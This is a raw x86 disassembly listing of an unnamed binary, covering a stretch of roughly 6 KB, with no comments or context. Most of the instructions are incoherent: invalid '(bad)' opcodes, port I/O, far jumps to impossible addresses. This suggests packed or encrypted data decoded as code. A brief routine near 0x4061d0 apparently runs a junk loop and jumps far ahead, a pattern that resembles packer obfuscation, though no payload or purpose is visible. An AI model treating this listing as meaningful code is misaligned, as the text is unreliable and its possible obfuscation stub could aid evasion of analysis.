  40610c:	cmp    DWORD PTR [edi],ebp
  40610e:	ins    BYTE PTR es:[edi],dx
  40610f:	ins    BYTE PTR es:[edi],dx
  406110:	xchg   ebp,eax
  406111:	int3   
  406112:	push   di
  406114:	and    ebx,DWORD PTR [ecx-0x21cd5a6c]
  40611a:	(bad)  
  40611b:	js     0x40614d
  40611d:	jbe    0x40611e
  40611f:	in     al,dx
  406120:	xor    al,0xfb
  406122:	ins    DWORD PTR es:[edi],dx
  406123:	jg     0x4060d7
  406125:	and    DWORD PTR [edx+0x2c],ecx
  406128:	into   
  406129:	stos   DWORD PTR es:[edi],eax
  40612a:	pop    esi
  40612b:	jg     0x40618e
  40612d:	ret    0xad2f
  406130:	and    esp,ecx
  406132:	loope  0x4060d1
  406134:	fiadd  DWORD PTR cs:[ecx]
  406137:	and    BYTE PTR [esi-0x4d],dh
  40613a:	fbstp  TBYTE PTR [esi]
  40613c:	outs   dx,DWORD PTR ds:[esi]
  40613d:	xchg   BYTE PTR [ecx+0x28fa3c0a],bl
  406143:	xchg   ebp,eax
  406144:	push   0x5ba7a2e7
  406149:	pop    ebp
  40614a:	pop    eax
  40614b:	adc    BYTE PTR [ecx],ah
  40614d:	mov    ah,0xa4
  40614f:	inc    ebx
  406150:	icebp  
  406151:	add    eax,0x5b474b92
  406156:	popa   
  406157:	or     esi,DWORD PTR [ebx-0x43688716]
  40615d:	pop    edi
  40615e:	outs   dx,DWORD PTR ds:[esi]
  40615f:	push   edx
  406160:	aam    0x45
  406162:	inc    edi
  406163:	inc    esp
  406164:	inc    esp
  406165:	out    0xc7,al
  406167:	cmp    cl,al
  406169:	mov    eax,0xc8ca4dcb
  40616e:	scas   eax,DWORD PTR es:[edi]
  40616f:	xor    ecx,ecx
  406171:	pushf  
  406172:	addr16 std 
  406174:	idiv   DWORD PTR [edx-0x501493b3]
  40617a:	enter  0xbad7,0xf
  40617e:	sub    ebx,DWORD PTR [ebx-0xf2fc50e]
  406184:	sub    eax,0xd987527f
  406189:	or     al,0xd4
  40618b:	mov    edx,0x25cb8a83
  406190:	neg    esi
  406192:	test   al,0xa3
  406194:	xchg   esi,eax
  406195:	sub    dl,ah
  406197:	jnp    0x4061c1
  406199:	push   es
  40619a:	xor    ecx,DWORD PTR [ebx]
  40619c:	sub    bh,0xb8
  40619f:	ret    0x71d4
  4061a2:	shl    ecx,cl
  4061a4:	out    0xa5,al
  4061a6:	loop   0x40612e
  4061a8:	pop    eax
  4061a9:	xchg   ebp,eax
  4061aa:	add    DWORD PTR [edx-0x1906327b],eax
  4061b0:	js     0x406183
  4061b2:	push   esp
  4061b3:	xor    eax,0xcc58aa28
  4061b8:	mov    BYTE PTR [ecx+ebx*1+0x3272f6],al
  4061bf:	mov    eax,DWORD PTR [ebp+0xc]
  4061c2:	xor    eax,esi
  4061c4:	add    eax,edi
  4061c6:	pop    edi
  4061c7:	pop    esi
  4061c8:	pop    ebx
  4061c9:	leave  
  4061ca:	ret    0x8
  4061cd:	xor    eax,eax
  4061cf:	ret    
  4061d0:	push   ebp
  4061d1:	mov    ebp,esp
  4061d3:	sub    esp,0x38
  4061d6:	and    DWORD PTR ds:0x428ec7,0x0
  4061e0:	xor    eax,eax
  4061e2:	xor    eax,DWORD PTR ds:0x428ec7
  4061e8:	inc    eax
  4061e9:	mov    ds:0x428ec7,eax
  4061ee:	cmp    DWORD PTR ds:0x428ec7,0x24
  4061f5:	jg     0x406216
  4061fb:	jmp    0x406209
  406200:	push   DWORD PTR [ebp-0x18]
  406203:	call   DWORD PTR ds:0x42aa1b
  406209:	cmp    DWORD PTR ds:0x428ec7,0x19
  406210:	jb     0x4061e0
  406216:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  40621d:	push   ebx
  40621e:	mov    eax,ds:0x428e23
  406223:	adc    DWORD PTR ds:0x428e9f,eax
  406229:	jmp    0x4085d8
  40622e:	xchg   ebp,eax
  40622f:	(bad)
  406232:	xchg   edx,eax
  406233:	add    al,0x95
  406235:	(bad)
  406239:	stos   DWORD PTR es:[edi],eax
  40623a:	and    dl,BYTE PTR [esi+0x3d0b0e1e]
  406240:	add    DWORD PTR [ebx-0x7c7c9f0f],0xffffff95
  406247:	(bad)  
  406248:	aam    0x7
  40624a:	adc    ecx,DWORD PTR [esi]
  40624c:	push   es
  40624d:	push   cs
  40624e:	mov    DWORD PTR [edi+0x3a],ebp
  406251:	inc    ebx
  406252:	fbld   TBYTE PTR [ebp-0x716a949c]
  406258:	dec    ebp
  406259:	lock lock add dl,0xdc
  40625e:	or     al,0xa3
  406260:	pop    ds
  406261:	xchg   ebp,eax
  406262:	pop    esp
  406263:	xor    al,0x3a
  406265:	(bad)
  406269:	inc    eax
  40626a:	(bad)  
  40626b:	int    0xe6
  40626d:	and    al,0xd4
  40626f:	es xchg ebx,eax
  406271:	js     0x40624e
  406273:	mov    dh,0x7c
  406275:	push   ss
  406276:	inc    ecx
  406277:	add    ah,ah
  406279:	adc    eax,0x33cb89ab
  40627e:	sbb    BYTE PTR [eax-0x5b73802a],bh
  406284:	rol    BYTE PTR gs:[esi-0x4d915501],0xc2
  40628c:	and    eax,DWORD PTR [eax-0x12]
  40628f:	push   ss
  406290:	jno    0x406273
  406292:	popf   
  406293:	ror    DWORD PTR [eax+eiz*8],0x76
  406297:	ja     0x406294
  406299:	nop
  40629a:	mov    BYTE PTR [ebp-0x39],dl
  40629d:	pushf  
  40629e:	aam    0xa6
  4062a0:	pop    es
  4062a1:	inc    ecx
  4062a2:	adc    al,0xe4
  4062a4:	jno    0x40631f
  4062a6:	clc    
  4062a7:	cwde   
  4062a8:	lock mov al,ds:0x2dbb3d03
  4062ae:	xlat   BYTE PTR ds:[ebx]
  4062af:	js     0x406307
  4062b1:	ret    
  4062b2:	inc    edx
  4062b3:	or     eax,0xb990382b
  4062b8:	out    dx,al
  4062b9:	jmp    0x62b7b0b9
  4062be:	dec    ebx
  4062bf:	inc    ebp
  4062c0:	push   esi
  4062c1:	out    0xf1,eax
  4062c3:	ja     0x406281
  4062c5:	jnp    0x4062c3
  4062c7:	fwait
  4062c8:	mov    cl,0x5f
  4062ca:	sahf   
  4062cb:	xchg   edi,eax
  4062cc:	dec    ebx
  4062cd:	mov    ah,0x34
  4062cf:	mov    eax,0x70988fcb
  4062d4:	int3   
  4062d5:	js     0x40627b
  4062d7:	loope  0x4062c2
  4062d9:	(bad)
  4062dd:	mov    bl,0x5
  4062df:	jns    0x40626e
  4062e1:	inc    esi
  4062e2:	cs dec esp
  4062e4:	jmp    0x4b3e:0xe43f4957
  4062eb:	imul   DWORD PTR [eax]
  4062ed:	scas   al,BYTE PTR es:[edi]
  4062ee:	push   ds
  4062ef:	pop    esp
  4062f0:	je     0x4062a2
  4062f2:	pop    ss
  4062f3:	in     eax,dx
  4062f4:	sbb    al,0x29
  4062f6:	ss jg  0x406317
  4062f9:	mov    ds:0xe76c3f9,eax
  4062fe:	pushf  
  4062ff:	rol    esp,cl
  406301:	ja     0x4062d2
  406303:	neg    dl
  406305:	pop    ds
  406306:	enter  0x9191,0x2c
  40630a:	sbb    BYTE PTR [ecx],0x68
  40630d:	icebp  
  40630e:	xchg   ebp,eax
  40630f:	arpl   WORD PTR [edi+0x4b21c5fd],bp
  406315:	sub    al,BYTE PTR [edx+0x3e26f1ac]
  40631b:	sub    BYTE PTR [eax+0x3f],cl
  40631e:	jmp    0x4062d7
  406320:	(bad)  
  406321:	sar    ebx,1
  406323:	sub    BYTE PTR [ebp+0x62],bl
  406326:	or     eax,0xa89a1266
  40632b:	js     0x40635e
  40632d:	fistp  WORD PTR [edi+0x2f]
  406330:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406331:	xlat   BYTE PTR ds:[ebx]
  406332:	bound  esi,QWORD PTR [eax+ecx*2-0x3]
  406336:	adc    DWORD PTR [ebp-0x1e],0xf81de145
  40633d:	mov    eax,0xc510f590
  406342:	imul   edx,eax,0xffffff92
  406345:	pop    ss
  406346:	pop    edi
  406347:	jb     0x40635f
  406349:	inc    eax
  40634a:	sbb    al,0xe6
  40634c:	dec    ebp
  40634d:	pop    esp
  40634e:	pop    ebp
  40634f:	adc    DWORD PTR [esi+0x1bed7088],0x31
  406356:	sbb    ecx,DWORD PTR [ebx+eiz*8+0x409096f8]
  40635d:	sub    ebx,ebp
  40635f:	sub    ch,bl
  406361:	mov    BYTE PTR [ebp+0x5e],dh
  406364:	stos   BYTE PTR es:[edi],al
  406365:	or     BYTE PTR [ebx+0x7194e875],dh
  40636b:	(bad)  
  40636c:	xor    cl,BYTE PTR [edx]
  40636e:	push   esi
  40636f:	push   edx
  406370:	push   edx
  406371:	mov    ch,0xb
  406373:	jmp    0x4063ec
  406375:	mov    DWORD PTR [eax-0x19],0xc293ffaa
  40637c:	and    edx,DWORD PTR [eax+0x50]
  40637f:	data16 cmc 
  406381:	mov    eax,0x2cd70726
  406386:	sub    DWORD PTR [ebp+ecx*4-0x46],ecx
  40638a:	cdq    
  40638b:	pusha  
  40638c:	and    dh,BYTE PTR [edx+esi*1+0xea5527a]
  406393:	mov    ecx,0x3f32c02b
  406398:	in     eax,dx
  406399:	adc    BYTE PTR [ebp-0x3e],dh
  40639c:	sub    al,0x38
  40639e:	mov    esi,0x903ba18
  4063a3:	mov    ah,0x6c
  4063a5:	push   DWORD PTR [ebp+0x10]
  4063a8:	sub    ch,BYTE PTR [edx-0x17]
  4063ab:	push   edx
  4063ac:	mov    ebx,0xa04ec521
  4063b1:	cs pop ecx
  4063b3:	test   eax,0x7235e5b4
  4063b8:	push   cs
  4063b9:	fisttp DWORD PTR [ecx]
  4063bb:	sbb    al,0xfb
  4063bd:	cld    
  4063be:	add    ecx,ebp
  4063c0:	fstp   TBYTE PTR [ebx]
  4063c2:	mov    ebp,0xfd62d8d8
  4063c7:	mov    cl,0xbc
  4063c9:	pop    ss
  4063ca:	sub    BYTE PTR [edx-0x64],0x63
  4063ce:	cmc    
  4063cf:	ret    
  4063d0:	xchg   ecx,eax
  4063d1:	sbb    edx,DWORD PTR [eax]
  4063d3:	ror    DWORD PTR [edx-0x44f940a4],cl
  4063d9:	mov    dl,0xa6
  4063db:	pop    edx
  4063dc:	or     al,0x5d
  4063de:	fdivr  st,st(7)
  4063e0:	cmp    edx,DWORD PTR [esi+esi*4-0x47]
  4063e4:	add    al,0x90
  4063e6:	outs   dx,DWORD PTR ds:[esi]
  4063e7:	fadd   DWORD PTR [ecx+0x6fae2573]
  4063ed:	push   es
  4063ee:	push   ebx
  4063ef:	cmp    ah,BYTE PTR [edi]
  4063f1:	adc    eax,0xf1195fa7
  4063f6:	xchg   ebx,eax
  4063f7:	std    
  4063f8:	outs   dx,BYTE PTR ds:[esi]
  4063f9:	mov    edi,0x869a4bfe
  4063fe:	ror    BYTE PTR [ebx-0x583d5dea],1
  406404:	lea    ecx,[eax+0x77]
  406407:	mov    ah,0x92
  406409:	ror    ch,0x9
  40640c:	or     DWORD PTR [ebx-0x7c165ace],esi
  406412:	mov    ah,0xad
  406414:	gs cmc 
  406416:	fwait
  406417:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406418:	jmp    0xfda18c71
  40641d:	pushf  
  40641e:	xor    edx,ebx
  406420:	inc    ecx
  406421:	push   edx
  406422:	cmp    ebp,esp
  406424:	add    DWORD PTR [ecx-0x44279042],edx
  40642a:	push   ecx
  40642b:	imul   edx,DWORD PTR [edx+0x13],0x29
  40642f:	lea    esp,[ecx+0x3c]
  406432:	gs push 0xd44e32bc
  406438:	mov    esp,0xb734c6bc
  40643d:	(bad)  
  40643e:	cmp    DWORD PTR [edx],esi
  406440:	jp     0x406445
  406442:	cmp    eax,0xe5e7f41d
  406448:	mov    ds:0x45c6a350,eax
  40644d:	mov    DWORD PTR [edx-0x438be2c6],eax
  406453:	sub    DWORD PTR [esi-0x157648c1],0xffffffeb
  40645a:	hlt    
  40645b:	adc    BYTE PTR [esi-0x6dade975],0x94
  406462:	(bad)  
  406465:	inc    ecx
  406466:	icebp  
  406467:	jb     0x406445
  406469:	shl    ebx,cl
  40646b:	jge    0x40648f
  40646d:	and    BYTE PTR [eax-0xd276e0],al
  406473:	ja     0x406480
  406475:	xor    bh,dh
  406477:	gs dec ecx
  406479:	inc    eax
  40647a:	into   
  40647b:	aas    
  40647c:	(bad)  
  40647d:	inc    edi
  40647e:	xor    BYTE PTR [edx+0x7f],bl
  406481:	loopne 0x4064e8
  406483:	iret   
  406484:	pop    edi
  406485:	mov    ch,0xa4
  406487:	or     bh,BYTE PTR [ebx-0x1f313570]
  40648d:	ror    BYTE PTR [ecx+0x36],cl
  406490:	imul   esi,DWORD PTR ds:0x877475ea,0x3c
  406497:	cmp    eax,0xd0171694
  40649c:	cmp    ebx,ebp
  40649e:	int    0x3a
  4064a0:	dec    edi
  4064a1:	xchg   DWORD PTR [eax+eax*4+0x14f4a06b],ecx
  4064a8:	dec    ebp
  4064a9:	push   0x56a218ff
  4064ae:	mov    ecx,esi
  4064b0:	inc    ecx
  4064b1:	ret    
  4064b2:	lds    edi,FWORD PTR [edi+0x3c6d27e8]
  4064b8:	out    0x2c,al
  4064ba:	(bad)  
  4064bb:	push   ds
  4064bc:	aas    
  4064bd:	pop    ss
  4064be:	pop    ds
  4064bf:	mov    ds:0xdfd920d0,eax
  4064c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064c5:	sub    eax,0x904def64
  4064ca:	inc    edx
  4064cb:	adc    BYTE PTR [edx-0x39809f55],0x62
  4064d2:	push   cs
  4064d3:	rcr    DWORD PTR [edi],1
  4064d5:	jbe    0x406526
  4064d7:	dec    ebx
  4064d8:	sar    al,0xc5
  4064db:	test   eax,0x8217c39a
  4064e0:	jnp    0x406483
  4064e2:	jg     0x4064c9
  4064e4:	xchg   BYTE PTR [eax-0x143c1dc7],dl
  4064ea:	div    DWORD PTR [ecx]
  4064ec:	shl    BYTE PTR [edx],1
  4064ee:	xchg   ecx,eax
  4064ef:	test   al,0x52
  4064f1:	pop    esi
  4064f2:	int    0x7e
  4064f4:	bnd jge 0x406501
  4064f7:	sbb    edx,esi
  4064f9:	mov    edx,0xd8b151b2
  4064fe:	not    BYTE PTR [ebp+0x130bd66c]
  406504:	sub    al,0x33
  406506:	inc    ecx
  406507:	xchg   esp,eax
  406508:	(bad)  
  406509:	and    cl,BYTE PTR [edi-0x1a]
  40650c:	pop    DWORD PTR [eax]
  40650e:	add    DWORD PTR [edx-0x8],ebp
  406511:	sbb    dh,BYTE PTR [edi+0x49e89579]
  406517:	mov    ebx,0x503e41f7
  40651c:	daa    
  40651d:	js     0x4064e0
  40651f:	leave  
  406520:	mov    gs,edi
  406522:	mov    es,WORD PTR [edi]
  406524:	inc    esp
  406525:	mov    al,0x82
  406527:	xchg   edx,eax
  406528:	cmp    al,0x93
  40652a:	mov    ch,0x90
  40652c:	out    0xaf,al
  40652e:	ret    
  40652f:	xor    eax,0xa946144b
  406534:	sbb    ebp,DWORD PTR [esi-0x786c7477]
  40653a:	jg     0x406513
  40653c:	xchg   esp,eax
  40653d:	inc    ecx
  40653e:	push   0x17201aea
  406543:	dec    esi
  406544:	jg     0x406535
  406546:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406547:	les    edx,FWORD PTR ss:[ebp-0x7f6e763c]
  40654e:	jecxz  0x406508
  406550:	lock aas 
  406552:	in     al,0xfa
  406554:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406555:	jnp    0x406541
  406557:	push   ds
  406558:	popf   
  406559:	outs   dx,BYTE PTR ds:[esi]
  40655a:	jmp    0x40651e
  40655c:	jge    0x40658d
  40655e:	add    ah,ch
  406560:	(bad)  
  406561:	shl    esp,cl
  406563:	bound  ebp,QWORD PTR [eax+0x43ea6ba8]
  406569:	repz pop eax
  40656b:	fld    DWORD PTR [edi]
  40656d:	cdq    
  40656e:	inc    DWORD PTR [edx*1+0x658242bf]
  406575:	sahf   
  406576:	dec    edi
  406577:	jmp    edi
  406579:	stos   DWORD PTR es:[edi],eax
  40657a:	cs or  dh,cl
  40657d:	push   edx
  40657e:	in     al,0x12
  406580:	dec    ecx
  406581:	add    al,0x6a
  406583:	sbb    BYTE PTR [ecx-0x9],dh
  406586:	stc    
  406587:	sub    ch,bl
  406589:	jnp    0x406525
  40658b:	loopne 0x406587
  40658d:	pushf  
  40658e:	adc    DWORD PTR [edi+ebp*2],0xffffffda
  406592:	pop    edx
  406593:	popf   
  406594:	mov    DWORD PTR [ebp-0x8],ebp
  406597:	add    DWORD PTR ds:0x7e131b87,esp
  40659d:	xor    eax,0xe45db575
  4065a2:	xlat   BYTE PTR ds:[ebx]
  4065a3:	in     al,dx
  4065a4:	(bad)  
  4065a5:	int    0x2c
  4065a7:	hlt    
  4065a8:	or     esi,DWORD PTR [edi+0x2b]
  4065ab:	cmp    dl,BYTE PTR [esi-0x30cc5c2b]
  4065b1:	pop    ebp
  4065b2:	retf   
  4065b3:	sub    BYTE PTR [esi-0x4f363577],al
  4065b9:	xchg   esp,eax
  4065ba:	(bad)  
  4065bb:	cld    
  4065bc:	jmp    0x3ce1:0x2fdc
  4065c2:	adc    ebx,DWORD PTR [edx-0x4a]
  4065c5:	jl     0x406613
  4065c7:	fstp   QWORD PTR [ebx]
  4065c9:	push   edx
  4065ca:	jmp    0x59c8:0xe2e765f8
  4065d1:	ins    DWORD PTR es:[edi],dx
  4065d2:	pop    esp
  4065d3:	and    BYTE PTR [eax],bl
  4065d5:	cmp    eax,0x2bd1e66b
  4065da:	icebp  
  4065db:	ds nop
  4065dd:	sub    BYTE PTR ds:0x227c45b5,al
  4065e3:	mov    cl,0xce
  4065e5:	in     eax,0x9e
  4065e7:	popa   
  4065e8:	rcl    dh,cl
  4065ea:	xor    edx,esi
  4065ec:	jle    0x406666
  4065ee:	arpl   WORD PTR [ebp-0x45],sp
  4065f1:	mov    bh,0x25
  4065f3:	add    eax,0x3cae5dcc
  4065f8:	retf   0xfb28
  4065fb:	add    BYTE PTR [ecx],ah
  4065fd:	sbb    eax,DWORD PTR [edx+esi*2-0x79]
  406601:	mov    dh,0x6b
  406603:	rcr    DWORD PTR [ecx-0x4cd10481],cl
  406609:	stos   DWORD PTR es:[edi],eax
  40660a:	lods   eax,DWORD PTR ds:[esi]
  40660b:	mov    ebp,0x8a05af7b
  406610:	mov    edi,0xbcc2ce57
  406615:	jg     0x4065e4
  406617:	retf   0x9a4d
  40661a:	stos   DWORD PTR es:[edi],eax
  40661b:	shl    edi,cl
  40661d:	fidiv  WORD PTR [esi+ebx*1-0x3b]
  406621:	lahf   
  406622:	std    
  406623:	(bad)  
  406624:	mov    al,0xd4
  406626:	dec    ebx
  406627:	xlat   BYTE PTR ds:[ebx]
  406628:	fisub  WORD PTR [edi]
  40662a:	mov    edx,0x637d7454
  40662f:	dec    esp
  406630:	or     ah,dl
  406632:	pop    edx
  406633:	ins    DWORD PTR es:[edi],dx
  406634:	lods   eax,DWORD PTR ds:[esi]
  406635:	dec    edi
  406636:	dec    ebp
  406637:	js     0x406647
  406639:	leave  
  40663a:	ja     0x40664f
  40663c:	das    
  40663d:	add    ebp,ebx
  40663f:	dec    edx
  406640:	jne    0x4066bf
  406642:	hlt    
  406643:	mov    dl,0xc
  406645:	sub    esp,DWORD PTR [esi+0x11]
  406648:	add    al,0x36
  40664a:	test   BYTE PTR [ebp+0x4f17279f],bh
  406650:	mov    ds:0x7dfffd24,al
  406655:	push   0x1b
  406657:	test   al,0xac
  406659:	ss push edx
  40665b:	sar    DWORD PTR [esp+esi*1-0x9],cl
  40665f:	ins    DWORD PTR es:[edi],dx
  406660:	mov    al,ds:0x86bb7d44
  406665:	lds    esi,FWORD PTR [esi+0x14]
  406668:	dec    esi
  406669:	shl    DWORD PTR [ebx-0xb],0xe8
  40666d:	test   eax,0xc3ce9d54
  406672:	push   ecx
  406673:	imul   ebp,esp,0x23
  406676:	mov    cl,bh
  406678:	outs   dx,BYTE PTR ds:[esi]
  406679:	and    bh,BYTE PTR [ebx-0x28]
  40667c:	xor    BYTE PTR [eax+0x4df02e39],dl
  406682:	or     eax,0xde7ed45e
  406687:	mov    ebx,0x85838744
  40668c:	push   cs
  40668d:	or     al,0x8d
  40668f:	push   0x61
  406691:	out    dx,al
  406692:	mov    BYTE PTR [eax-0x2d],bh
  406695:	lds    edx,FWORD PTR [esp+edx*2+0x34]
  406699:	dec    ecx
  40669a:	sub    esp,eax
  40669c:	mov    ah,0xd
  40669e:	jp     0x406682
  4066a0:	outs   dx,DWORD PTR ds:[esi]
  4066a1:	xor    edx,ecx
  4066a3:	inc    esp
  4066a4:	or     eax,0x5aa01659
  4066a9:	enter  0x1197,0x31
  4066ad:	nop
  4066ae:	retf   0x1b04
  4066b1:	scas   eax,DWORD PTR es:[edi]
  4066b2:	out    dx,eax
  4066b3:	out    0xa5,eax
  4066b5:	cmp    BYTE PTR [eax+0x1507b0f3],cl
  4066bb:	jmp    0x610e:0x47bcdc09
  4066c2:	mov    eax,ds:0x6f371e87
  4066c7:	pop    es
  4066c8:	imul   esi,DWORD PTR [ebp+0x56],0x2a2573e1
  4066cf:	retf   
  4066d0:	pop    esi
  4066d1:	rcr    BYTE PTR [edx],cl
  4066d3:	mov    bh,0xb
  4066d5:	stos   BYTE PTR es:[edi],al
  4066d6:	in     al,0x5d
  4066d8:	or     BYTE PTR [ecx+0x11],ah
  4066db:	movsx  esi,BYTE PTR [edi+ebx*1+0x22a1fea5]
  4066e3:	aaa    
  4066e4:	fst    QWORD PTR [edx-0x63be542e]
  4066ea:	icebp  
  4066eb:	fsub   DWORD PTR [edx-0x6b9b27bc]
  4066f1:	jb     0x406695
  4066f3:	js     0x406711
  4066f5:	and    ebx,esp
  4066f7:	(bad)  
  4066f8:	aad    0x1d
  4066fa:	scas   al,BYTE PTR es:[edi]
  4066fb:	jo     0x4066e8
  4066fd:	sbb    al,0xc4
  4066ff:	jp     0x406707
  406701:	ss pushf 
  406703:	add    ebx,edx
  406705:	imul   edx,DWORD PTR ds:0x96493a33,0xb
  40670c:	jo     0x40675d
  40670e:	test   DWORD PTR [edi],ecx
  406710:	and    BYTE PTR [eax+0x75],0xa5
  406714:	mov    cl,0xe9
  406716:	idiv   DWORD PTR [eax]
  406718:	cmp    ah,bh
  40671a:	sub    eax,0x4d19e6e5
  40671f:	push   esi
  406720:	mov    bl,0x6d
  406722:	pop    eax
  406723:	ret    
  406724:	mov    ah,dh
  406726:	push   ecx
  406727:	add    BYTE PTR [ecx+0x31],cl
  40672a:	pop    edx
  40672b:	cdq    
  40672c:	dec    ax
  40672e:	shufps xmm1,xmm2,0x17
  406732:	jg     0x406740
  406734:	sbb    al,0xa2
  406736:	mov    ss,WORD PTR [eax-0x65]
  406739:	(bad)  
  40673a:	(bad)  
  40673b:	rcr    DWORD PTR [eax-0x70],1
  40673e:	mov    dl,0x94
  406740:	pop    esi
  406741:	pcmpeqw mm7,QWORD PTR [eax]
  406744:	shl    BYTE PTR [eax-0x2e],1
  406747:	jge    0x40674b
  406749:	paddw  mm3,QWORD PTR [esi-0x6a126fc0]
  406750:	loop   0x4067af
  406752:	pop    edx
  406753:	mov    ds,WORD PTR [ebx+0x74b2ea66]
  406759:	fidiv  DWORD PTR [ecx-0x6f]
  40675c:	addr16 push 0x36
  40675f:	pop    ds
  406760:	loope  0x4067be
  406762:	mov    dl,0x18
  406764:	cmp    al,BYTE PTR [ebx-0x5c9585b2]
  40676a:	in     eax,0xa2
  40676c:	add    bl,bh
  40676e:	and    ax,0x416f
  406772:	outs   dx,BYTE PTR ds:[esi]
  406773:	dec    edx
  406774:	sbb    al,0xac
  406776:	rcr    BYTE PTR [edi-0x4e3353cc],cl
  40677c:	and    ebp,DWORD PTR [ebp-0x30a71a8d]
  406782:	pop    esi
  406783:	mov    WORD PTR [edi+0x314eb71b],ss
  406789:	fsubr  QWORD PTR [ebx-0x1e]
  40678c:	loope  0x406722
  40678e:	jecxz  0x406792
  406790:	dec    esi
  406791:	mov    al,0xc3
  406793:	sbb    eax,0xfd5bf486
  406798:	data16 mov dl,0x53
  40679b:	mov    es,WORD PTR [eax-0x77]
  40679e:	mov    ebx,0x4fa6437
  4067a3:	rcl    DWORD PTR [ebx+eiz*8-0x44],cl
  4067a7:	sub    ch,BYTE PTR [esi+0x5e]
  4067aa:	fucompp 
  4067ac:	imul   edx,DWORD PTR [ebx],0x777b1cdf
  4067b2:	pop    es
  4067b3:	mov    WORD PTR ds:0xf47e8129,gs
  4067b9:	sbb    DWORD PTR [edi],edx
  4067bb:	fst    st(7)
  4067bd:	ret    0xb2ca
  4067c0:	aam    0x58
  4067c2:	jecxz  0x406770
  4067c4:	hlt    
  4067c5:	add    cl,BYTE PTR gs:[ecx+ebp*2+0x6b]
  4067ca:	push   0x1f
  4067cc:	and    al,0xa4
  4067ce:	(bad)  
  4067cf:	in     eax,0x3e
  4067d1:	xchg   DWORD PTR [edx],edx
  4067d3:	scas   eax,DWORD PTR es:[edi]
  4067d4:	jp     0x4067fd
  4067d6:	mov    ecx,0x5bc00e68
  4067db:	adc    ah,ch
  4067dd:	(bad)  
  4067de:	repnz xlat BYTE PTR ds:[ebx]
  4067e0:	stos   DWORD PTR es:[edi],eax
  4067e1:	gs jno 0x4067cb
  4067e4:	xor    cl,BYTE PTR [edi-0x45]
  4067e7:	iret   
  4067e8:	add    dl,al
  4067ea:	pop    ds
  4067eb:	dec    esp
  4067ec:	sub    esp,esi
  4067ee:	mov    edi,0x550a22d4
  4067f3:	out    dx,al
  4067f4:	mov    ds:0x96205360,eax
  4067f9:	scas   al,BYTE PTR es:[edi]
  4067fa:	adc    al,0x72
  4067fc:	mov    ebx,0xd37193c
  406801:	aaa    
  406802:	adc    eax,0x679e4c1
  406807:	inc    ecx
  406808:	push   esi
  406809:	jle    0x406833
  40680b:	shl    ebp,cl
  40680d:	ror    DWORD PTR [edx],0xb1
  406810:	or     cl,BYTE PTR [edi]
  406812:	fiadd  DWORD PTR [esi]
  406814:	lea    ebp,[edi-0x348d08e4]
  40681a:	loope  0x406840
  40681c:	test   BYTE PTR [edx+0x4a],ah
  40681f:	xchg   edx,eax
  406820:	into   
  406821:	sbb    eax,0x2b2b6be4
  406826:	xor    BYTE PTR [eax],cl
  406828:	or     BYTE PTR [ecx+0x2f],ah
  40682b:	in     eax,0x65
  40682d:	mov    al,ds:0xddbf2b27
  406832:	mov    al,ds:0x944f214f
  406837:	(bad)  
  406838:	iret   
  406839:	sbb    DWORD PTR [ecx+esi*4+0x29c66274],esi
  406840:	sub    bl,BYTE PTR [ebp+0x69e59c80]
  406846:	sub    eax,0xe3fbf7d8
  40684b:	push   ebx
  40684c:	sbb    BYTE PTR [eax+0x71c87be6],cl
  406852:	add    ebp,DWORD PTR [edi-0x7d]
  406855:	in     al,0xf4
  406857:	in     eax,dx
  406858:	xchg   DWORD PTR [esi-0x4d47b525],edi
  40685e:	xor    BYTE PTR [ebp-0x1f],bh
  406861:	mov    ecx,0x6785bfb4
  406866:	sbb    eax,0x6d00534c
  40686b:	in     al,0xc4
  40686d:	montmul (bad)
  40686e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40686f:	(bad)  
  406870:	es jp  0x406848
  406873:	loope  0x4068d0
  406875:	mov    ah,BYTE PTR [eax-0x5d]
  406878:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406879:	dec    edi
  40687a:	dec    ebp
  40687b:	enter  0x28aa,0xe6
  40687f:	mov    ebx,0x692ffaf4
  406884:	sti    
  406885:	mov    ecx,0x2f0f2658
  40688a:	aas    
  40688b:	js     0x4068f0
  40688d:	and    esp,DWORD PTR [ebx+0xb]
  406890:	xchg   edi,eax
  406891:	mov    cl,BYTE PTR [eax]
  406893:	mov    al,ds:0xd84055ca
  406898:	repnz mov cl,0x2
  40689b:	jnp    0x4068f9
  40689d:	ds test esp,0x285748e2
  4068a4:	shr    DWORD PTR [edi],0x40
  4068a7:	xchg   edi,eax
  4068a8:	push   ecx
  4068a9:	imul   ecx,DWORD PTR ds:0x966726fd,0x4d
  4068b0:	mov    ebx,0x4518a69d
  4068b5:	sub    DWORD PTR [edx-0x46],0x55
  4068b9:	punpcklwd mm4,mm3
  4068bc:	pop    edi
  4068bd:	stc    
  4068be:	xchg   esi,eax
  4068bf:	lahf   
  4068c0:	fadd   DWORD PTR [ecx+0x7a3c21d5]
  4068c6:	call   0xae21:0x640c1bc9
  4068cd:	or     ebp,DWORD PTR [esp+eax*2+0xe]
  4068d1:	push   es
  4068d2:	lea    ecx,[esp+ebx*4]
  4068d5:	add    ebx,DWORD PTR [edi-0x13]
  4068d8:	mul    ah
  4068da:	sbb    bh,BYTE PTR [ebx+0x1f6ba86b]
  4068e0:	dec    edi
  4068e1:	xchg   ebp,eax
  4068e2:	push   0xffffffaa
  4068e4:	pop    ss
  4068e5:	nop
  4068e6:	add    BYTE PTR [ebx+0x3f769c89],0xe2
  4068ed:	mov    edi,DWORD PTR ds:0x5d3891ed
  4068f3:	mov    ah,BYTE PTR [bx+si]
  4068f6:	pop    ss
  4068f7:	pop    eax
  4068f8:	jp     0x40687e
  4068fa:	(bad)  
  4068fc:	enter  0x8c96,0xe3
  406900:	aad    0x42
  406902:	xchg   ebx,eax
  406903:	cmp    al,0x12
  406905:	dec    edi
  406906:	adc    eax,0xe62ac37a
  40690b:	call   0xd294:0x2717b3ff
  406912:	xchg   ch,bh
  406914:	pxor   mm3,QWORD PTR [edi-0x52]
  406918:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406919:	addr16 xor al,0xa0
  40691c:	jae    0x406959
  40691e:	mov    eax,0xf82b7e17
  406923:	test   eax,0x2ee6f5f0
